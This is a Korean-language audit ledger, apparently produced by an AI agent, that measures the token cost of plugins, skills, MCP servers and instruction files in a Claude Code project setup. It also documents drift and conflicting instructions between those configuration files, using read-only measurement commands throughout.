| K-08 | `C:/DEV/FOMS/.claude/skills/*/SKILL.md`(5개) | 프로젝트 스킬 5종(diagnosing-bugs·handoff·overnight·wayfinder·writing-great-skills) description 목록 비용 | L6(목록 비용) | 실측: diagnosing-bugs 156자/한0, handoff 86자/한0, overnight 128자/한62, wayfinder 199자/한0, writing-great-skills 108자/한0 → 합계 677자, 한글 62자 | KEEP(2026-08-03 ablation에서 이미 발췌 5종으로 축소 완료 — `docs/harness/policy/DECISIONS.md:37`) | 비한글(615자)÷3.5=175.7 + 한글(62자)×0.8=49.6 ≈ 225토큰/세션 | 낮음 | — |
| K-09 | `C:/DEV/FOMS/.claude/commands/*.md`(4개) | 프로젝트 커맨드 4종(perf-audit·perf-gate·perf-guard·status) — frontmatter 없음, 목록엔 첫 줄(제목)이 description으로 노출 | L6(목록 비용) | 실측(각 파일 1행): `perf-audit (Claude Code)`=24자, `perf-gate (Claude Code)`=23자, `perf-guard (Claude Code)`=24자, `FOMS 컨텍스트/상태 관리 (Context Manager)`=33자(한글 8) → 합계 104자, 한글 8자. 실제 세션 리마인더 표시 문구와 1:1 일치 확인(`status: FOMS 컨텍스트/상태 관리 (Context Manager)`) | KEEP-FACT(perf-* 3종은 `.cursor/skills/*/SKILL.md`를 SSOT로 위임하는 얇은 어댑터 — 코드 아님, 포인터) | (96자)÷3.5=27.4 + (8자)×0.8=6.4 ≈ 34토큰/세션 | 낮음 | — |
| K-10 | `C:/DEV/FOMS/.mcp.json:2-7` | MCP `postgres` 서버, 도구 9개 | L2(환경 사실: DB 접속 정보) | 이 세션의 deferred-tools 목록 실측: `mcp__postgres__{analyze_db_health,analyze_query_indexes,analyze_workload_indexes,execute_sql,explain_query,get_object_details,get_top_queries,list_objects,list_schemas}` = 9개 | KEEP-FACT | 이름 목록만 상시 노출(스키마는 지연로드) — 도구명 9개 ≈ 30자 안팎 | 낮음 | — |
| K-11 | `C:/DEV/FOMS/.mcp.json:8-14` | MCP `context7` 서버, 도구 2개 | L2 | 실측: `mcp__context7__{query-docs,resolve-library-id}` = 2개 | KEEP-FACT | 미미 | 낮음 | — |
| K-12 | `C:/DEV/FOMS/.mcp.json:15-21` vs `C:/DEV/FOMS/.claude/settings.local.json:14-18` | MCP `solapi` 서버(도구 46개, 알림톡/카카오)가 `.mcp.json`엔 정의돼 있으나 **`enabledMcpjsonServers` 허용목록엔 없음**(postgres·context7·youtube만 등재) | L7(설정 드리프트) | `.mcp.json`에 solapi 블록 존재(15-21행) 확인. `.claude/settings.local.json` `enabledMcpjsonServers: ["postgres","context7","youtube"]`에 solapi 없음. 그런데 이 세션의 deferred-tools 목록에는 `mcp__solapi__*` 46개가 실제로 잡힘(cancel_inspect_kakao_template ~ upgrade_solactl) → **허용목록이 게이트 역할을 못 하거나(다른 승인 경로), 허용목록 자체가 stale** | RESOLVE(둘 중 하나가 죽은 설정 — 총괄이 실제 게이트 메커니즘 확인 후 allowlist에 solapi 추가 또는 별도 승인 경로 문서화) | 46개 도구명 상시 노출, 46÷3.5 이름토큰 별도(추정 200~300자) | 중간 — 알림톡 발송류 위험 도구(send_sms 등)가 허용목록 밖인데도 세션에 노출되는 건 문서-실제 불일치이지 권한 우회는 아님(승인은 여전히 필요) | allowlist 정합성 회귀 감지 시 |
| K-13 | `C:/DEV/FOMS/.claude/settings.local.json:14-18` vs `C:/DEV/FOMS/CLAUDE.md:39` | `youtube` MCP가 CLAUDE.md·allowlist 양쪽에서 "정본"으로 언급되지만 **`.mcp.json`엔 정의 자체가 없음**(유령 항목) | L7(문서-실제 불일치) | CLAUDE.md:39 원문 "MCP 정본: 루트 `.mcp.json` (postgres, context7, youtube). youtube=자막 조회..." / 실제 `.mcp.json` 서버 3개는 postgres·context7·**solapi**(youtube 없음, K-12와 동일 파일 확인). 이 세션 deferred-tools에도 `mcp__youtube__*` 없음(직접 대조) | RESOLVE(CLAUDE.md:39 문구를 실제 파일에 맞게 수정하거나 youtube 서버를 재추가) | CLAUDE.md 한 줄(약 46자) 자체는 작지만 **틀린 사실을 상시 로드**하는 게 문제(허위 KEEP-FACT) | 중간 — 다음 세션이 "youtube 자막 조회 가능"이라 믿고 시도하면 실패·시간 낭비 | 재측정 시 항상 |
| K-14 | 이 세션 deferred-tools 목록(claude.ai 커넥터) | claude.ai Gmail 29개·Google Calendar 9개·Google Drive 11개 = 49개 도구명 상시 나열(Microsoft 365은 미인증 — 도구 스키마 비노출) | L2(환경 사실: 연결된 커넥터) / L6(목록) | 실측 카운트(deferred-tools 블록 직접 셈): Gmail 29, Calendar 9, Drive 11. `~/.claude.json`의 `claudeAiMcpEverConnected` = `["claude.ai Gmail","claude.ai Google Drive","claude.ai Google Calendar","claude.ai Claude Code Remote"]` — Microsoft 365는 이 목록에 없고 이번 세션은 "인증 필요" 상태로 관측됨(도구 스키마 비공개) | KEEP-FACT(연결 여부는 저장소로 유도 불가) — 단 FOMS 업무에 Gmail/Calendar/Drive 49개 도구가 실제로 쓰이는지는 별도 확인 필요(확신=의문) | 49개 도구명 상시 노출, 문자수 추정 400~600자(이름만) | 낮음(개별 호출엔 여전히 승인 필요) | FOMS 세션에서 이 커넥터 사용 이력이 전무하면 DOWNGRADE(프로젝트 무관 커넥터를 이 저장소 세션에서 분리) 후보로 재평가 |
| K-15 | `C:/DEV/FOMS/CLAUDE.md`(전체) | 프로젝트 CLAUDE.md 재측정: 6,801자(한글 1,797자) — 지시서 §2.1과 완전 일치 | 측정 전용(판정은 audit1-rules 담당) | `python -c "print(len(open('CLAUDE.md',encoding='utf-8').read()))"` = 6801. **방법론 주의**: 이 환경의 `wc -m`은 멀티바이트 문자를 바이트 단위로 세는 것으로 확인됨(`wc -m CLAUDE.md`=10647, `wc -c`와 동일값) → 유니코드 문자 수는 반드시 python `len()` 또는 동급 도구로 셀 것, `wc -m`으로 재현하면 안 됨(재측정 시 함정) | N/A(측정전용) | — | — | — |
| K-16 | `~/.claude/CLAUDE.md`(전체) | 전역 CLAUDE.md 재측정: 1,610자(한글 760자) — 지시서 §2.1과 완전 일치 | 측정 전용 | 동일 방법(python len) | N/A(측정전용) | — | — | — |
| K-17 | `~/.claude/projects/c--DEV-FOMS/memory/MEMORY.md`(전체) | MEMORY.md 재측정: **12,449자(한글 2,254자), 항목 링크 153개** — 지시서 §2.1의 "12,308자"보다 +141자 드리프트(항목 개수 153은 동일) | 측정 전용 | `python len()`=12449, `grep -o "\[.*\](" MEMORY.md \| wc -l`=153. 지시서 작성 시점(같은 날 2026-09-09) 이후 세션 중 메모리 항목이 추가/수정되며 자수만 증가하고 링크 개수는 유지된 것으로 추정(항목 내용 수정, 신규 항목 없음 가능성) | N/A(측정전용, 표본 30개 감사는 워커④ 담당) | — | — | — |
| K-18 | `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/using-superpowers/SKILL.md:11` vs `~/.claude/CLAUDE.md:33` | superpowers "1% 스킬 강제" 규칙 ↔ 전역 CLAUDE.md의 명시적 부정 문장이 **동시에 매 세션 로드** | L7 | 아래 §4 상충 인용 절 참조(원문 그대로) | RESOLVE | K-01 절감과 중복 계상 금지(같은 텍스트) | 높음 — 강한 모델일수록 두 상충 지시 중 하나를 문자 그대로 따르며 흔들릴 소지(지시서 §1-3 H4) | 스킬 과호출·행동 흔들림 재발 시(§7 실험으로 확인 예정) |
| K-19 | `C:/DEV/FOMS/CLAUDE.md:6` vs `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:15,17` | 프로젝트 CLAUDE.md "한자 금지 … 압축 스킬(caveman 등)의 축약 지시보다 본 규칙이 우선" 문장 자체가 caveman을 상쇄하기 위해서만 존재 | L7(단 caveman은 L3, 유지여부 미판정) | 아래 §4 참조 | RESOLVE 후보(caveman을 끄면 이 문장 불필요 — 사용자 결정 대기) | CLAUDE.md 1줄(약 96자) — caveman 끄면 K-01~05와 함께 소멸 | 낮음 | caveman 재활성 시 이 상쇄 문장 필요성 재확인 |
| K-20 | `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:21,45` vs 내장 시스템 프롬프트(claude-code-guide 교차확인) | caveman "no decorative tables/emoji" ↔ 내장의 "숫자는 표로" 성향 | L7 후보이나 **확신=의문**(claude-code-guide 응답: "공식 문서에 표 형식 지침 없음, 상충 문서화 안 됨") | claude-code-guide 에이전트 질의 결과 원문: "**내장 지침 없음** — 공식 Claude Code 문서는 기본 시스템 프롬프트가 숫자·정량 데이터를 표 형식으로 제시하도록 명시하지 않습니다" | RESOLVE 보류 — 직접 상충 미확정, §4.1의 "내장에 있는 것으로 확인된 주제" 목록에도 표-형식 규칙은 없음 | — | 낮음(caveman 자체가 이 감사 파일처럼 표 형식 산출물을 요구받으면 사용자/작업 지시가 우선한다는 caveman 자체 문구는 없음 — using-superpowers:88 "User instructions ... take precedence" 원용 가능) | 실사용에서 caveman 활성 세션이 표 요청을 거부하는 사례가 나오면 확정으로 격상 |
| K-21 | `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:27` vs 내장 시스템 프롬프트(교차확인) | caveman "No preamble, plan, or progress note before or between calls" ↔ 내장의 "도구 호출 전 한 줄 알림" 성향 | L7 후보, **확신=의문** | claude-code-guide 응답 원문: "**내장 지침 불확실** — 공식 문서에 명시되지 않음. 다만 ... 도구를 호출하기 전에 의도나 계획을 짧게 설명하는 경향이 있으나 ... 문서화된 지침으로 확인되지 않음" | RESOLVE 보류(K-20과 동일 사유) | — | 낮음 | 좌동 |
| K-22 | `docs/harness/policy/DECISIONS.md:35` vs `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/hooks/hooks.json`(실측) | 2026-08-03 결정문 "superpowers SessionStart 훅 무력화" ↔ 현재 hooks.json이 정상 등록 상태로 복원됨 | L7(결정-실태 드리프트, 지시서 §2.6·§5-1과 동일 사실의 file:line 확정) | DECISIONS.md:35 원문(발췌): "...(5) ponytail 비활성·superpowers SessionStart 훅 무력화(스킬은 온디맨드 유지)..." / 현재 hooks.json 원문(위 K-01에 전재) — `SessionStart` 매처가 살아있고 `run-hook.cmd`가 정상 실행 경로임을 코드로 확인 | MOVE-TO-CODE(문서 재진술 대신 "플러그인 업데이트 시 hooks.json 복원됨" 가드 테스트로 이관 — 지시서 §5-1이 이미 제안) | K-01과 동일 텍스트, 중복 계상 금지 | 높음 — 결정 기록이 실제 상태를 보장 못 함이 실증됨(플러그인 자동 업데이트가 결정을 되돌림) | 다음 플러그인 업데이트 후 재발 여부로 판정 |
| K-23 | `C:/DEV/FOMS/CLAUDE.md:39` vs `C:/DEV/FOMS/.mcp.json:1-22` vs `.claude/settings.local.json:14-18` | "MCP 정본" 서술 3곳(CLAUDE.md 산문, .mcp.json 실제 정의, settings.local.json 허용목록)이 서로 다른 3개 집합을 가리킴 | L7(3벌 복제·불일치) | CLAUDE.md는 {postgres,context7,youtube}라 서술, .mcp.json 실제는 {postgres,context7,solapi}, allowlist는 {postgres,context7,youtube} — 3자 중 어느 둘도 완전히 일치하지 않음(K-12·K-13과 근거 공유, 원인은 하나로 통합 가능) | RESOLVE(파일 하나를 SSOT로 정하고 나머지 2곳은 포인터로) | — | 중간 — "MCP 정본"이라 자칭하는 문장이 신�oehr 못할 상태 | 재측정 시 항상 |

---

## 1.5 상시 토큰 추정 합계(이 워커 담당 범위 전체, 1개 숫자)

**세션 시작 1회성 상시 로드 비용(플러그인 주입 + 스킬 목록 + 상시 텍스트 3파일) ≈ 14,704토큰**

산출: 플러그인 SessionStart 주입(절 1) 2,293 + 스킬 목록(절 2) 3,977 + 상시 텍스트 3파일(절 4) 8,434 = **14,704토큰**. (MCP 도구명 106개·claude.ai 커넥터 49개는 이름 목록 문자수만 절 3에 별도 기재 — 토큰화 방식이 불확실한 도구 스키마 지연로드 항목이라 위 합계엔 미포함. caveman 턴당 리인포스 ≈16토큰/턴도 세션 길이에 따라 변동하므로 위 1회성 합계엔 미포함, 절 1에 별도 기재.)

## 2. 절 1~5 집계표

### 절 1 — 플러그인 3종

| 플러그인 | 상태 | 훅 이벤트 | 세션당 주입 텍스트(1회성) | 턴당 주입 | 스킬 개수 | 확인 명령 |
|---|---|---|---|---|---|---|
| superpowers 6.3.0 | 활성(`enabledPlugins.superpowers@claude-plugins-official=true`) | SessionStart(startup\|clear\|compact) | 3,360자(≈960토큰) | 없음 | 14 | `cat ~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/hooks/hooks.json`; `wc -m .../skills/using-superpowers/SKILL.md`; `find .../skills -maxdepth 1 -type d \| wc -l` |
| caveman(81536f57b330) | 활성, 모드=`full`(`cat ~/.claude/.caveman-active`) | SessionStart + UserPromptSubmit(매 턴) | 4,664자(≈1,333토큰) | ≈55자/턴(≈16토큰/턴) | 20 | `cat ~/.claude/plugins/cache/caveman/caveman/81536f57b330/.claude-plugin/plugin.json`; `python sim_caveman.py`(스크래치패드, activate.js 필터 로직 재현) |
| ponytail(4.8.4) | **비활성**(`enabledPlugins.ponytail@ponytail=false`) | 없음(비활성) | 0자 | 0 | 6(비활성이라 미노출) | `grep -A3 enabledPlugins ~/.claude/settings.json` |

플러그인 소계(1회성, 활성 2종): 3,360+4,664 = **8,024자 ≈ 2,293토큰/세션**(startup·clear·compact마다 재과금). 턴당 caveman 리인포스는 세션 길이에 비례해 별도 누적.

### 절 2 — 스킬 목록 비용

| 출처 | 개수 | description 합계(자) | 한글(자) | 토큰 추정(비한글÷3.5+한글×0.8) | 확인 명령 |
|---|---|---|---|---|---|
| 전역 `~/.claude/skills` | 59(gstack 57·caveman 1·last30days 1) | 4,941 | 0 | 1,412 | `ls ~/.claude/skills` + 파이썬 frontmatter 파서(부록 A) |
| 프로젝트 `.claude/skills` | 5 | 677 | 62 | 193.4+49.6=243.0 | 상동, 프로젝트 경로 |
| 프로젝트 `.claude/commands` | 4(frontmatter 없음, 1행 제목 사용) | 104 | 8 | 27.4+6.4=33.8 | `head -1 .claude/commands/*.md` |
| 플러그인 superpowers 스킬 | 14 | 1,861 | 0 | 531.7 | 부록 B |
| 플러그인 caveman 스킬 | 20 | 6,140 | 0 | 1,754.3 | 부록 B |
| **합계(세션 스킬 목록 전체)** | **102** | **13,723** | **70** | **3,976.9 ≈ 3,977** | 위 5행 합 |

사용 흔적(2026-08-03 이후, `git log --since=2026-08-03 --format=%s`·`docs/AI_CHANGELOG.md`·`docs/harness/runtime/SESSION_LOG.md`): gstack-*·diagnosing-bugs·wayfinder·handoff·overnight·brainstorming·writing-plans·systematic-debugging·caveman 등 검색한 전 스킬명 **0건**. 단 `perf-gate`만 커밋 제목에 7건(스킬 호출이 아니라 perf-gate 관련 파일·기능 커밋일 가능성이 높음 — 직접 대조 필요, 워커④ 영역). **판정 기준**: SESSION_LOG.md는 편집 파일만 기록하고 Skill 도구 호출 자체를 기록하지 않으므로(직접 확인, 위 K-02 근거) "0건"은 "미사용 확정"이 아니라 "이 세 로그로는 판별 불가"다. 지시서가 "판정은 목록 비용 기준"이라 명시했으므로 위 원장 각 행은 사용 여부와 무관하게 L6 목록 비용으로 계상했다.

### 절 3 — MCP

| 서버 | 정의 위치 | allowlist 등재 | 이번 세션 실제 노출 | 도구 개수 | 확인 |
|---|---|---|---|---|---|
| postgres | `.mcp.json` | O | O | 9 | deferred-tools 직접 셈 |
| context7 | `.mcp.json` | O | O | 2 | 상동 |
| solapi | `.mcp.json` | **X**(allowlist 없음) | O(46개 노출) | 46 | 상동 — K-12 드리프트 |
| youtube | **없음**(정의 자체 부재) | O(allowlist엔 있음) | X | 0 | `.mcp.json` grep, deferred-tools에 `mcp__youtube__` 없음 — K-13 드리프트 |
| claude.ai Gmail | claude.ai 커넥터(프로젝트 파일 아님) | 해당없음 | O | 29 | deferred-tools 직접 셈 |
| claude.ai Google Calendar | 상동 | 해당없음 | O | 9 | 상동 |
| claude.ai Google Drive | 상동 | 해당없음 | O | 11 | 상동 |
| claude.ai Microsoft 365 | 상동 | 해당없음 | **미인증**(도구 목록 비공개) | 도구 목록은 세션에서만 보임 | 시스템 알림("requires authentication") |

MCP 도구명 합계(현재 세션 노출분, Microsoft 365 제외) = 9+2+46+29+9+11 = **106개**.

### 절 4 — 상시 텍스트 재측정

| 파일 | 지시서 §2.1 값 | 재측정 값 | 드리프트 | 토큰 추정(비한글÷3.5+한글×0.8) |
|---|---|---|---|---|
| 프로젝트 CLAUDE.md | 108줄 6,801자(한글 1,797) | 109줄(개행 포함 카운트 차이) 6,801자(한글 1,797) | 0 | (5004/3.5)+(1797×0.8)=1429.7+1437.6=**2,867.3** |
| 전역 CLAUDE.md | 42줄 1,610자 | 43줄 1,610자(한글 760) | 0 | (850/3.5)+(760×0.8)=242.9+608=**850.9** |
| MEMORY.md | 12,308자(153항목) | 12,449자(한글 2,254, 153항목) | **+141자**(항목수는 동일 — 기존 항목 내용 증량 추정) | (10195/3.5)+(2254×0.8)=2912.9+1803.2=**4,716.1** |
| **3파일 합계** | 약 8,400토큰(지시서 총괄 추정) | — | — | **8,434.3 ≈ 8,434토큰**(지시서 추정과 오차 +34, 재현 가능한 공식 확인됨) |

방법론 확인: 위 표의 토큰 공식(비한글자÷3.5 + 한글자×0.8)을 3파일에 적용하면 8,434토큰이 나와 지시서의 "약 8,400토큰" 총괄 추정과 거의 일치 — **이 공식이 지시서 §2.1 수치의 실제 산출 방법으로 재현 확인됨**(지시서엔 공식이 명시돼 있지 않았으나 역산으로 확정).

**함정 기록**: 이 환경의 `wc -m`은 UTF-8 멀티바이트 문자를 문자 단위가 아니라 **바이트 단위**로 센다(`wc -m AGENTS.md`=13985 == `wc -c AGENTS.md`=13985, 반면 `python len()`=8859). CLAUDE.md 2종은 어차피 한글 비중이 달라 우연히 차이가 드러나지 않았지만, 다른 워커가 `wc -m`으로 한글 비중 높은 파일을 재측정하면 지시서 수치와 안 맞을 수 있다 — **재측정은 python `len()` 또는 동급 유니코드 인식 도구로 할 것**.

### 절 5 — 상충

아래 §4 원문 인용 절 참조. 6쌍 확보(요구 5쌍 이상 충족), 그중 2쌍(K-20·K-21)은 확신=의문으로 격하.

---

## 3. 부록 A — 전역 스킬 59종 원시 데이터(description 글자수/한글수)

```
_gstack-command                    chars=  43 han=0
caveman                            chars= 404 han=0
gstack                             chars=  43 han=0
gstack-autoplan                    chars= 171 han=0
gstack-benchmark                   chars=  66 han=0
gstack-benchmark-models            chars=  49 han=0
gstack-browse                      chars=  66 han=0
gstack-canary                      chars=  39 han=0
gstack-careful                     chars=  52 han=0
gstack-claude                      chars= 341 han=0
gstack-codex                       chars=  48 han=0
gstack-connect-chrome              chars=  83 han=0
gstack-context-restore             chars=  64 han=0
gstack-context-save                chars=  30 han=0
gstack-cso                         chars=  37 han=0
gstack-design-consultation         chars= 208 han=0
gstack-design-html                 chars=  83 han=0
gstack-design-review               chars= 150 han=0
gstack-design-shotgun              chars= 129 han=0
gstack-devex-review                chars=  41 han=0
gstack-diagram                     chars= 177 han=0
gstack-document-generate           chars=  94 han=0
gstack-document-release            chars=  40 han=0
gstack-freeze                      chars=  69 han=0
gstack-guard                       chars=  81 han=0
gstack-health                      chars=  32 han=0
gstack-investigate                 chars=  60 han=0
gstack-ios-clean                   chars=  85 han=0
gstack-ios-design-review           chars=  59 han=0
gstack-ios-fix                     chars=  34 han=0
gstack-ios-qa                      chars=  45 han=0
gstack-ios-sync                    chars=  86 han=0
gstack-land-and-deploy             chars=  34 han=0
gstack-landing-report              chars=  60 han=0
gstack-learn                       chars=  25 han=0
gstack-make-pdf                    chars=  63 han=0
gstack-office-hours                chars=  37 han=0
gstack-open-gstack-browser         chars=  83 han=0
gstack-pair-agent                  chars=  50 han=0
gstack-plan-ceo-review             chars=  38 han=0
gstack-plan-design-review          chars=  75 han=0
gstack-plan-devex-review           chars=  54 han=0
gstack-plan-eng-review             chars=  38 han=0
gstack-plan-tune                   chars=  99 han=0
gstack-qa                          chars=  69 han=0
gstack-qa-only                     chars=  32 han=0
gstack-retro                       chars=  42 han=0
gstack-review                      chars=  31 han=0
gstack-scrape                      chars=  35 han=0
gstack-setup-browser-cookies       chars=  89 han=0
gstack-setup-deploy                chars=  51 han=0
gstack-setup-gbrain                chars= 154 han=0
gstack-ship                        chars= 132 han=0
gstack-skillify                    chars=  95 han=0
gstack-spec                        chars=  74 han=0
gstack-sync-gbrain                 chars=  98 han=0
gstack-unfreeze                    chars=  91 han=0
gstack-upgrade                     chars=  37 han=0
last30days                         chars= 246 han=0
TOTAL_CHARS 4941 TOTAL_HAN 0 COUNT 59
```
(재현 명령: 스크래치패드 `extract_desc.py`, 프론트매터 `description:` 파싱 — block scalar(`>`) 포함 처리)

## 4. 부록 B — 플러그인 스킬 원시 데이터

```
=== SUPERPOWERS(14) ===
brainstorming 198 / dispatching-parallel-agents 106 / executing-plans 104 /
finishing-a-development-branch 101 / receiving-code-review 234 /
requesting-code-review 107 / subagent-driven-development 85 /
systematic-debugging 91 / test-driven-development 79 / using-git-worktrees 196 /
using-superpowers 154 / verification-before-completion 225 / writing-plans 84 /
writing-skills 97   합계=1861 한글=0

=== CAVEMAN PLUGIN(20) ===
cavecrew 552 / caveman 404 / caveman-commit 346 / caveman-compress 334 /
caveman-discover 416 / caveman-evidence-review 366 / caveman-explore 407 /
caveman-help 195 / caveman-learn 452 / caveman-manage 351 / caveman-optimize 404 /
caveman-review 310 / caveman-setup 348 / caveman-stats 256 / investigate-first 169 /
lean-build 178 / migration 172 / safe-refactor 156 / surgical-patch 162 /
verify-and-stop 162   합계=6140 한글=0
```

---

## 5. 상충 원문 인용 절 (6쌍)

### 쌍 1 — superpowers "1% 스킬 강제" ↔ 전역 CLAUDE.md §4 부정

- `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/skills/using-superpowers/SKILL.md:11`
  > If you think there is even a 1% chance a skill might apply to what you are doing, you ABSOLUTELY MUST invoke the skill.
- `~/.claude/CLAUDE.md:33`
  > 오타·상수·소규모 수정·질문 답변은 플랜 루프 생략, 바로 처리. 스킬은 필요할 때만 온디맨드 호출 — "1%라도 해당하면 스킬 강제" 류의 상시 규칙은 따르지 않는다.
- 확신: **확정**. 둘 다 이번 세션에 실제로 동시 로드됨(superpowers hooks.json 원문 실측 + 전역 CLAUDE.md 시스템 리마인더 원문 대조).

### 쌍 2 — 프로젝트 CLAUDE.md 한자 금지 규칙 ↔ caveman 축약 지시(상쇄 목적)

- `C:/DEV/FOMS/CLAUDE.md:6`
  > **한글 응답에 한자를 쓰지 않는다.** 토큰 절약·압축을 이유로 한국어 낱말을 한자나 다른 언어 낱말로 바꾸지 않는다 (고유명사·코드·API 이름은 예외). 압축 스킬(caveman 등)의 축약 지시보다 본 규칙이 우선한다.
- `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:11,15`
  > Respond terse like smart caveman. All technical substance stay. Only fluff die.
  > Default style for this whole session, every response, until user say "stop caveman" or "normal mode".
- 확신: **확정**(CLAUDE.md:6 문장의 존재 이유 자체가 이 caveman 규칙을 상쇄하기 위함 — caveman을 끄면 이 문장의 "압축 스킬(caveman 등)의 축약 지시보다 본 규칙이 우선" 절반이 불필요해짐). caveman 유지 여부는 L3 취향이라 미판정.

### 쌍 3 — caveman "no decorative tables/emoji" ↔ 내장 시스템 프롬프트(교차확인 결과)

- `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:21`
  > No tool-call narration, no decorative tables/emoji, no dumping long raw error logs unless asked quote shortest decisive line.
- claude-code-guide 에이전트 교차확인 응답(원문):
  > **내장 지침 없음** — 공식 Claude Code 문서(modifying-system-prompts 등)는 기본 시스템 프롬프트가 숫자·정량 데이터를 표 형식으로 제시하도록 명시하지 않습니다.
- 확신: **의문**(직접 상충이 아니라 caveman이 내장보다 더 엄격한 것으로 판명 — RESOLVE 보류, §4.1 "내장에 있는 것으로 확인된 주제" 목록에도 표-형식 규칙 없음).

### 쌍 4 — caveman "no preamble before/between tool calls" ↔ 내장 시스템 프롬프트(교차확인 결과)

- `~/.claude/plugins/cache/caveman/caveman/81536f57b330/skills/caveman/SKILL.md:27`
  > Tool calls: fire direct. No preamble, plan, or progress note before or between calls. After result: next call direct or final answer never announce next call.
- claude-code-guide 에이전트 교차확인 응답(원문):
  > **내장 지침 불확실** — 공식 문서에 명시되지 않음. 다만 Claude Code의 일반적인 동작 관찰상, 도구를 호출하기 전에 의도나 계획을 짧게 설명하는 경향이 있으나, 이는 모델의 일반적 성향이지 기본 시스템 프롬프트의 명시 지침으로 문서화되지 않았습니다.
- 확신: **의문**(관찰 성향 대 명시 규칙 — 문서화된 상충 아님).

### 쌍 5 — 2026-08-03 결정("훅 무력화") ↔ 현재 hooks.json 실측(복원됨)

- `docs/harness/policy/DECISIONS.md:35`
  > ...(5) ponytail 비활성·superpowers SessionStart 훅 무력화(스킬은 온디맨드 유지)·범용 발췌 스킬 7종 삭제(프로젝트 특화 5종 유지).
- `~/.claude/plugins/cache/claude-plugins-official/superpowers/6.3.0/hooks/hooks.json:1-15`(전문, 위 K-01에 원문 인용)
  > "SessionStart": [{"matcher": "startup|clear|compact", "hooks": [{"type": "command", "command": "\"${CLAUDE_PLUGIN_ROOT}/hooks/run-hook.cmd\" session-start", ...}]}]
- 확신: **확정**(결정문은 "무력화"를 선언했으나 실측 파일은 정상 등록 상태 — 플러그인 6.3.0 업데이트가 결정을 되돌렸다는 지시서 §2.6 서술과 일치).

### 쌍 6 — "MCP 정본" 서술(CLAUDE.md) ↔ 실제 `.mcp.json` 구성 ↔ allowlist

- `C:/DEV/FOMS/CLAUDE.md:39`
  > **MCP 정본**: 루트 `.mcp.json` (postgres, context7, youtube). youtube=자막 조회(uvx mcp-youtube-transcript), 메타데이터 보조=`yt-dlp` CLI.
- `C:/DEV/FOMS/.mcp.json:1-22`(전문, 위 §1 도입부에 원문 인용) — 실제 서버는 `postgres`·`context7`·**`solapi`**(youtube 없음)
- `C:/DEV/FOMS/.claude/settings.local.json:14-18`
  > "enabledMcpjsonServers": ["postgres", "context7", "youtube"]
- 확신: **확정**(3곳이 서로 다른 서버 집합을 "정본"으로 서술 — CLAUDE.md와 allowlist는 youtube를 공유하지만 정작 `.mcp.json`엔 youtube가 없고, 활성 서버 solapi는 allowlist에서 빠짐).

---

## 6. 애매한 판정(총 3개, 최종 답변에도 반복)

1. **K-02·K-05 (superpowers·caveman 스킬 목록 COMPRESS 후보)** — 사용 흔적 "0건"이 SESSION_LOG.md·AI_CHANGELOG.md·git 제목 검색의 설계 한계(Skill 호출을 애초에 기록하지 않음) 때문인지, 실제 미사용인지 이 정적 감사만으로는 분리 불가. COMPRESS/DELETE 확정은 트랜스크립트 레벨 Skill 호출 카운트(§7 실험 또는 별도 계측)가 있어야 함.
2. **K-12 (solapi가 `.mcp.json`엔 있지만 allowlist엔 없는데 실제로는 활성)** — allowlist가 진짜 게이트가 아니거나(다른 승인 경로 존재), allowlist 자체가 stale인 두 가설 중 무엇이 맞는지 이 세션의 읽기 전용 조사로는 확정 불가. 총괄이 Claude Code의 `enabledMcpjsonServers` 실제 동작(프로젝트 신뢰 시 전체 허용 등)을 `claude-code-guide`로 재확인 필요.
3. **K-20·K-21 (caveman "표 금지"·"도구 호출 전 서술 금지" ↔ 내장 성향 상충)** — claude-code-guide 교차확인 결과 "공식 문서 미기재"로 나와 확신 등급을 확정에서 의문으로 낮췄다. 지시서 §5 항목2는 이 둘을 "확정"으로 서술했으나, 이번 재확인으로는 "caveman이 내장보다 엄격할 뿐 직접 텍스트 상충은 아님"이 더 정확한 서술이다 — 지시서 원안과 다른 결론이므로 총괄 재검토 요청.


# 조각 4 — ledger-part-4-memory.md

# 하네스 ablation v2 — 정적 감사 워커 4 원장 (메모리 + docs/plans)

- 담당: §5 항목 12·13, §6, §9.1 형식, §2.5 대조
- 이 세션 기준 HEAD: `fe21a5cc3`(재측정 — `git log --oneline -1`). 메타 프롬프트 사실 카드 기준 커밋 `46bdac44d` 과 다르다(그 뒤 커밋 진행됨) — 수치가 사실 카드와 다르면 아래에 "(재측정: 값 — 명령)" 으로 병기했다.
- 읽기 전용 감사. 저장소·메모리 파일 수정 없음. 이 출력 파일 하나만 썼다.

---

## A. 메모리 표본 감사 (M-01 ~ M-30)

### A.1 전체 분포

디렉토리: `C:/Users/USER/.claude/projects/c--DEV-FOMS/memory/`

- 파일 수(제외 MEMORY.md): **153개**. 명령: `ls "C:/Users/USER/.claude/projects/c--DEV-FOMS/memory/"*.md | wc -l` → 154(MEMORY.md 포함) − 1.
- type 별 개수(frontmatter `metadata.type`, `node_type` 와 혼동 주의 — `^\s*type:\s*(\w+)` 로 라인 앵커 필요, 안 그러면 `node_type: memory` 가 오매칭됨): **project 138 · feedback 13 · reference 2**. 명령: 아래 파이썬 스니펫(정규식 `^\s*type:\s*(\w+)`, `re.MULTILINE`).
  - 사실 카드(§2.5)는 "project 138 · feedback 13 · reference 1 · user 0" — reference 가 1개 차이(재측정: reference 2 — 위 명령, `project_system_review_prompt_set_2026_09.md` 도 reference 로 확인됨).
- `modified:` 프론트매터가 있는 파일 90개 중 2026-08-03 이후 **74개**(사실 카드 "73개" 대비 재측정: 74 — 동일 명령, 날짜 갱신 1건 차이로 추정). frontmatter 에 `modified:` 필드 **자체가 없는 파일 63개**(주로 짧은 `type: project`, `metadata:` 3줄짜리 최신 포맷 — 예 `project_as_visit_slot_is_per_order.md`). 파일시스템 mtime 은 신뢰 불가로 배제: `os.path.getmtime` 기준으로는 153개 중 142개가 2026-08-03 이후로 나오는데(명령: 아래 스니펫 2), 이는 최근 통짜 touch/체크아웃 흔적이지 실제 편집 시각이 아니다 — frontmatter `modified:` 가 있는 90개만 신뢰.
